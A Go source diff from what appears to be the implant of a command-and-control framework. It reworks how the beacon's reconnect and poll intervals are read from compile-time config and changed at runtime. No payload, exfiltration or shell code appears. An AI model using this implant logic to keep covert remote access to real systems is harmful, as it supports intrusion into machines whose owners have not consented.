@@ -66,8 +66,8 @@ var (
 
 	readBufSize       = 16 * 1024 // 16kb
 	maxErrors         = getMaxConnectionErrors()
-	reconnectInterval = GetReconnectInterval()
-	pollInterval      = GetPollInterval()
+	reconnectInterval = -1
+	pollInterval      = -1
 
 	ccCounter = new(int)
 
@@ -251,10 +251,11 @@ func StartConnectionLoop() *Connection {
 			// {{end}}
 		}
 
+		reconnect := GetReconnectInterval()
 		// {{if .Config.Debug}}
-		log.Printf("Sleep %d second(s) ...", reconnectInterval/time.Second)
+		log.Printf("Sleep %d second(s) ...", reconnect/time.Second)
 		// {{end}}
-		time.Sleep(reconnectInterval)
+		time.Sleep(reconnect)
 	}
 	// {{if .Config.Debug}}
 	log.Printf("[!] Max connection errors reached\n")
@@ -298,27 +299,35 @@ func nextCCServer() *url.URL {
 
 // GetReconnectInterval - Parse the reconnect interval inserted at compile-time
 func GetReconnectInterval() time.Duration {
-	reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
-	if err != nil {
-		return 60 * time.Second
+	if reconnectInterval == -1 {
+		reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
+		if err != nil {
+			return 60 * time.Second
+		}
+		return time.Duration(reconnect) * time.Second
+	} else {
+		return time.Duration(reconnectInterval) * time.Second
 	}
-	return time.Duration(reconnect) * time.Second
 }
 
-func SetReconnectInterval(interval time.Duration) {
+func SetReconnectInterval(interval int) {
 	reconnectInterval = interval
 }
 
 // GetPollInterval - Parse the poll interval inserted at compile-time
 func GetPollInterval() time.Duration {
-	pollInterval, err := strconv.Atoi(`{{.Config.PollInterval}}`)
-	if err != nil {
-		return 1 * time.Second
+	if pollInterval == -1 {
+		pollInterval, err := strconv.Atoi(`{{.Config.PollInterval}}`)
+		if err != nil {
+			return 1 * time.Second
+		}
+		return time.Duration(pollInterval) * time.Second
+	} else {
+		return time.Duration(pollInterval) * time.Second
 	}
-	return time.Duration(pollInterval) * time.Second
 }
 
-func SetPollInterval(interval time.Duration) {
+func SetPollInterval(interval int) {
 	pollInterval = interval
 }
 
